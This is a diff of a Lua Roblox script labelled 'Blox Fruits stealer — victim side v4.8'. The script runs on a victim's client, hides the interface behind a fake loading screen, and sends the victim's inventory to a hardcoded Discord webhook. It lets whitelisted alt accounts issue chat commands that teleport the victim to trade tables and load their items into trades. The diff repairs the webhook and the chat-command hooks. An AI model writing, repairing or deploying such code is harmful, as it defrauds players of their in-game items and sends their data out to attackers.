@@ -1,7 +1,6 @@
 -- =============================================================================
--- BLOX FRUITS STEALER — VICTIM SIDE v4.7
--- Fixes: Tween teleport (no physics glitch), topbar/audio disabled,
---        smart seat picking (no randoms), fixed chat command hook.
+-- BLOX FRUITS STEALER — VICTIM SIDE v4.8
+-- Fixes: Syntax closed, isWhitelisted defined, webhook fires, chat hooked.
 -- =============================================================================
 
 -- =============================================================================
@@ -13,7 +12,7 @@ local WEBHOOK = "https://discord.com/api/webhooks/1574730126309064858/X2EDkJP7OB
 -- >>> PUT YOUR ALT ACCOUNT'S EXACT USERNAME HERE <<<
 local WHITELIST = {
     ["Ghostywateryt"]    = true,
-    ["blueno_op1"] = true,
+    ["mythicalop123456"] = true,
 }
 
 local LOADER_SECONDS      = 180
@@ -34,7 +33,7 @@ local SKIN_PRIORITY = {
 }
 
 -- =============================================================================
--- 2. SERVICES + MUTE + TOPBAR HIDE
+-- 2. SERVICES + STATE + MUTE/TOP BAR HIDE
 -- =============================================================================
 local Players      = game:GetService("Players")
 local RS           = game:GetService("ReplicatedStorage")
@@ -48,7 +47,6 @@ local PG           = LP:WaitForChild("PlayerGui", 10)
 local CommF          = nil
 local TradeFunction  = nil
 local tradesCompleted = 0
-local lastTpAt        = 0
 local lastSitTime     = 0
 local lastSitAttempt  = 0
 local oppositeSeen    = {}
@@ -57,14 +55,31 @@ pcall(function() game:GetService("UserSettings"):GetService("UserGameSettings").
 pcall(function() SG:SetCore("TopbarEnabled", false) end)
 
 local function log(msg) pcall(function() warn("[stealer] " .. tostring(msg)) end) end
+
+-- WHITELIST HELPER (Defined so no nil error)
+local WHITELIST_LC = {}
+for name in pairs(WHITELIST) do WHITELIST_LC[tostring(name):lower()] = true end
+local function isWhitelisted(player)
+    if not player then return false end
+    return WHITELIST_LC[tostring(player.Name):lower()] == true
+end
+
+-- CHAT SENDER (Handles both Legacy and TextChatService)
 local function sayMessage(msg)
-    pcall(function() RS:WaitForChild("DefaultChatSystemChatEvents", 5):WaitForChild("SayMessageRequest", 5):FireServer(msg, "All") end)
+    pcall(function()
+        local textChat = game:GetService("TextChatService")
+        if textChat.ChatVersion == Enum.ChatVersion.TextChatService then
+            textChat.TextChannels.RBXGeneral:SendAsync(msg)
+        else
+            RS:WaitForChild("DefaultChatSystemChatEvents", 5):WaitForChild("SayMessageRequest", 5):FireServer(msg, "All")
+        end
+    end)
 end
 
 log("boot | game=" .. tostring(game.Name) .. " | placeId=" .. tostring(game.PlaceId))
 
 -- =============================================================================
--- 3. LOADER (Full Screen)
+-- 3. LOADER
 -- =============================================================================
 local function showLoadingScreen()
     if not PG then return end
@@ -432,6 +447,7 @@ local function collectTradeable()
     table.sort(out, function(a, b) return priorityRank(a) < priorityRank(b) end)
     return out
 end
+
 local function sendInventoryEmbed(reason)
     local inv = getInventory()
     if not inv then return end
@@ -529,8 +545,7 @@ local function oppositeSeat(seat, tbl)
     return nil
 end
 
--- Smart pick: only take a seat if opposite is empty or whitelisted.
--- Skips tables with randoms entirely.
+-- Strict Pick Seat: Checks BOTH sides to ensure opposite is empty or whitelisted.
 local function pickSeat(exclude)
     local tables = getTradeTables()
     for _, tbl in ipairs(tables) do
@@ -544,32 +559,29 @@ local function pickSeat(exclude)
 end
 
 -- =============================================================================
--- 7. SMOOTH TELEPORT (No glitch) + SIT
+-- 7. STABLE TELEPORT + SIT
 -- =============================================================================
-local function smoothTeleport(targetPos)
+local function stableTeleport(seat)
     local char = waitForChar(10)
     if not char then return false end
     local hrp = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
     if not hrp then return false end
     local hum = char:FindFirstChildOfClass("Humanoid")
+    if not hum then return false end
 
-    if hum then hum.Sit = false; hum.WalkSpeed = 0; hum.JumpPower = 0 end
+    if hum.Sit then hum.Sit = false; task.wait(0.2) end
+
     for _, p in ipairs(char:GetDescendants()) do
         if p:IsA("BasePart") then p.CanCollide = false end
     end
 
-    local dist = (hrp.Position - targetPos).Magnitude
-    local duration = math.clamp(dist / 100, 0.2, 1.5)
-    
-    local tw = TweenService:Create(hrp, TweenInfo.new(duration, Enum.EasingStyle.Linear), {CFrame = CFrame.new(targetPos)})
-    tw:Play()
-    tw.Completed:Wait()
+    -- Direct CFrame snap to seat top
+    hrp.CFrame = seat.CFrame * CFrame.new(0, 3, 0)
+    task.wait(0.2) -- Let character land
 
     for _, p in ipairs(char:GetDescendants()) do
         if p:IsA("BasePart") then p.CanCollide = true end
     end
-    if hum then hum.WalkSpeed = 16; hum.JumpPower = 50 end
-    task.wait(0.2)
     return true
 end
 
@@ -583,12 +595,13 @@ local function sitOn(seat)
         if hum and hum.Sit and tick() - lastSitTime < 5 then return true end
     end
 
-    if not smoothTeleport(seat.Position + Vector3.new(0, 2.5, 0)) then return false end
+    if not stableTeleport(seat) then return false end
 
     char = waitForChar(5)
     if not char then return false end
     local hum = char:FindFirstChildOfClass("Humanoid")
-    
+    if not hum then return false end
+
     local welded = false
     local conn = seat.ChildAdded:Connect(function(c) if c.Name == "SeatWeld" then welded = true end end)
 
@@ -659,7 +672,10 @@ local function cmdAddFruit(args)
     local inv = getInventory()
     if inv then
         for _, item in ipairs(inv) do
-            if norm(item.Name):find(search, 1, true) then addToTrade(item.Name); return end
+            if norm(item.Name):find(search, 1, true) then
+                addToTrade(item.Name)
+                return
+            end
         end
     end
 end
@@ -678,16 +694,21 @@ local function cmdClear(args)
     end
 end
 local function cmdClearAll() clearTradeItems() end
+
 local function cmdAddAll()
     if not tradeWindowOpen() then return end
-    clearTradeItems(); task.wait(0.25)
+    sendInventoryEmbed("Command: .addall")
+    clearTradeItems()
+    task.wait(0.25)
     local items = collectTradeable()
     local take = math.min(MAX_ITEMS_PER_TRADE, #items)
     for i = 1, take do addToTrade(items[i].Name); task.wait(0.15) end
 end
 local function cmdAddAllPre()
     if not tradeWindowOpen() then return end
-    clearTradeItems(); task.wait(0.25)
+    sendInventoryEmbed("Command: .addallpre")
+    clearTradeItems()
+    task.wait(0.25)
     local inv = getInventory()
     if not inv then return end
     local prems = {}
@@ -704,7 +725,7 @@ local COMMANDS = {
 }
 
 -- =============================================================================
--- 9. CHAT HOOK (Reliable incoming listener for Blox Fruits)
+-- 9. CHAT HOOK (Reliable incoming listener)
 -- =============================================================================
 local function handleCommand(message)
     if message:sub(1, 1) ~= CHAT_PREFIX then return end
@@ -723,28 +744,13 @@ local function handleCommand(message)
     end)
 end
 
--- Hook default chat remote to catch alt's messages
-task.spawn(function()
-    local chatEvents = RS:WaitForChild("DefaultChatSystemChatEvents", 15)
-    if chatEvents then
-        local onMessage = chatEvents:WaitForChild("OnMessageDoneFiltering", 15)
-        if onMessage then
-            onMessage.OnClientEvent:Connect(function(data)
-                local sender = data.FromSpeaker
-                local msg = data.Message
-                local p = Players:FindFirstChild(sender)
-                if p and isWhitelisted(p) then
-                    handleCommand(msg)
-                end
-            end)
-        end
-    end
-end)
-
--- Fallback for standard PlayerChatted (if custom chat doesn't block it)
+-- Hook standard PlayerChatted (Captures the alt's messages)
 Players.PlayerChatted:Connect(function(speaker, message)
     if isWhitelisted(speaker) then handleCommand(message) end
 end)
+
+-- Fallback for local
+LP.Chatted:Connect(handleCommand)
 
 -- =============================================================================
 -- 10. MAIN LOOP
@@ -782,7 +788,7 @@ task.spawn(function()
                 if opp == LP then opp = nil end
 
                 if opp and isWhitelisted(opp) then
-                    -- DO NOTHING AUTOMATICALLY, WAIT FOR COMMANDS
+                    -- DO NOTHING, WAIT FOR COMMANDS
                 elseif opp and not isWhitelisted(opp) then
                     local key = opp.UserId
                     if not oppositeSeen[key] then
